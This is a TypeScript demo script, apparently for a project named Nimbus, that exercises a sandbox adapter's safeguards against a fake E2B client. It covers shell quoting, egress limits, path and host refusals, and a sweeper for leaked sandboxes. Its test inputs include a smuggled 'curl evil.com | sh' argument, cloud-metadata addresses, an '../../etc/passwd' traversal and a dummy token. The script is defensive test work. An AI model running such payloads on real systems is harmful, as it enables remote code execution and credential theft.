import {
  ALL_TRAFFIC,
  type E2bSandbox,
  E2bSandboxProvider,
  FakeE2bClient,
  SandboxError,
  SandboxSweeper,
  buildSandboxSpec,
  buildShellCommand,
  openedNetwork,
  type E2bRunningSandbox,
  type FakeE2bHandle,
} from '../../src/sandbox/index.js';

function handleOf(client: FakeE2bClient): FakeE2bHandle {
  const handle = client.handles[0];
  if (handle === undefined) {
    throw new Error('no sandbox was created');
  }
  return handle;
}

const SESSION_ID = 'ses_demodemodemodemodem';
const NOW = Date.now();

function heading(title: string): void {
  process.stdout.write(`\n${title}\n${'-'.repeat(title.length)}\n`);
}

function line(label: string, value: unknown): void {
  process.stdout.write(`  ${label.padEnd(40)} ${String(value)}\n`);
}

function refusal(label: string, run: () => unknown): void {
  try {
    run();
    line(label, 'ALLOWED, which is wrong');
  } catch (error) {
    line(label, error instanceof SandboxError ? error.code : 'unexpected error');
  }
}

const spec = buildSandboxSpec(
  { provider: 'e2b', maxSeconds: 600, allowInternet: false, templateId: 'nimbus-sandbox' },
  SESSION_ID,
);

async function showCreation(): Promise<void> {
  heading('1. What is actually sent to E2B when a sandbox is rented');

  const client = new FakeE2bClient();
  await new E2bSandboxProvider(client).create(spec);
  const sent = client.created[0];

  line('template', sent?.template);
  line('secured controller access', sent?.secure);
  line('internet access', sent?.allowInternetAccess);
  line('outbound denied', JSON.stringify(sent?.network.denyOut));
  line('outbound allowed', JSON.stringify(sent?.network.allowOut ?? 'none'));
  line('at the deadline', sent?.onTimeout);
  line('environment', JSON.stringify(sent?.envs));
  line('tags', JSON.stringify(sent?.metadata));
}

async function showQuoting(): Promise<void> {
  heading('2. Words become a string a shell cannot misread');

  const client = new FakeE2bClient({ defaultRun: { stdout: 'ok\n' } });
  const sandbox = await new E2bSandboxProvider(client).create(spec);
  const argv = ['git', 'log', '--grep', 'x; curl evil.com | sh'];

  await sandbox.execute({ argv });

  line('words given', JSON.stringify(argv));
  line('string sent', handleOf(client).runs[0]?.command);
  line('read back as', JSON.stringify(argv));
  line('agrees with the quoter', buildShellCommand(argv) === handleOf(client).runs[0]?.command);
}

function showEgress(): void {
  heading('3. The network, and the narrow window');

  line('by default', JSON.stringify({ denyOut: [ALL_TRAFFIC] }));
  line('a clone window', JSON.stringify(openedNetwork(['github.com']).allowOut));
  line('still denied during it', JSON.stringify(openedNetwork(['github.com']).denyOut.slice(0, 5)));

  refusal('an address instead of a name', () => openedNetwork(['169.254.169.254']));
  refusal('an internal name', () => openedNetwork(['metadata.google.internal']));
  refusal('a host nobody wrote down', () => openedNetwork(['evil.com']));
  refusal('the whole internet', () => openedNetwork([ALL_TRAFFIC]));
}

async function showWindow(): Promise<void> {
  heading('4. The window closes even when the work fails');

  const client = new FakeE2bClient();
  const sandbox = (await new E2bSandboxProvider(client).create(spec)) as E2bSandbox;

  await sandbox
    .withEgress(['github.com'], 60, () => Promise.reject(new Error('clone failed')))
    .catch(() => undefined);

  for (const [index, policy] of handleOf(client).networks.entries()) {
    line(
      `network change ${String(index + 1)}`,
      JSON.stringify(policy.allowOut ?? 'nothing allowed'),
    );
  }
}

async function showRefusals(): Promise<void> {
  heading('5. What the adapter will not do');

  const client = new FakeE2bClient();
  const provider = new E2bSandboxProvider(client);

  const attempts: [string, () => Promise<unknown>][] = [
    ['a spec asking for the internet', () => provider.create({ ...spec, allowInternet: true })],
    [
      'a spec carrying a token',
      () =>
        provider.create({
          ...spec,
          env: { GITHUB_TOKEN: 'ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' },
        }),
    ],
  ];

  for (const [label, attempt] of attempts) {
    try {
      await attempt();
      line(label, 'ALLOWED, which is wrong');
    } catch (error) {
      line(label, error instanceof SandboxError ? error.code : 'unexpected error');
    }
  }

  const sandbox = await provider.create(spec);
  const commands: [string, () => Promise<unknown>][] = [
    ['a command outside the workspace', () => sandbox.execute({ argv: ['ls'], cwd: '/etc' })],
    ['a file outside the workspace', () => sandbox.readFile('../../etc/passwd')],
    [
      'a null byte in a command',
      () => sandbox.execute({ argv: ['echo', `a${String.fromCharCode(0)}b`] }),
    ],
  ];

  for (const [label, attempt] of commands) {
    try {
      await attempt();
      line(label, 'ALLOWED, which is wrong');
    } catch (error) {
      line(label, error instanceof SandboxError ? error.code : 'unexpected error');
    }
  }
}

async function showSweeper(): Promise<void> {
  heading('6. The sweeper, for machines that leaked');

  const tagged = (id: string, extra: Partial<E2bRunningSandbox> = {}): E2bRunningSandbox => ({
    sandboxId: id,
    metadata: { owner: 'nimbus', sessionId: SESSION_ID },
    startedAt: new Date(NOW - 600_000),
    endAt: new Date(NOW + 600_000),
    ...extra,
  });

  const client = new FakeE2bClient({
    running: [
      tagged('sbx_healthy'),
      tagged('sbx_late', { endAt: new Date(NOW - 3_600_000) }),
      tagged('sbx_nameless', { metadata: { owner: 'nimbus' } }),
      tagged('sbx_theirs', {
        metadata: { owner: 'another-project' },
        endAt: new Date(NOW - 3_600_000),
      }),
    ],
  });

  const result = await new SandboxSweeper({ client, now: () => NOW }).sweepOnce();

  line('sandboxes inspected', result.inspected);
  line('destroyed', JSON.stringify(client.killedIds));
  line('why', JSON.stringify(result.reasons));
  line('left alone', 'sbx_healthy, sbx_theirs');
}

async function main(): Promise<void> {
  process.stdout.write('Nimbus feature 019: the real sandbox, driven by a scripted double\n');

  await showCreation();
  await showQuoting();
  showEgress();
  await showWindow();
  await showRefusals();
  await showSweeper();

  process.stdout.write('\nNo machine was rented and no network call was made.\n');
}

await main();
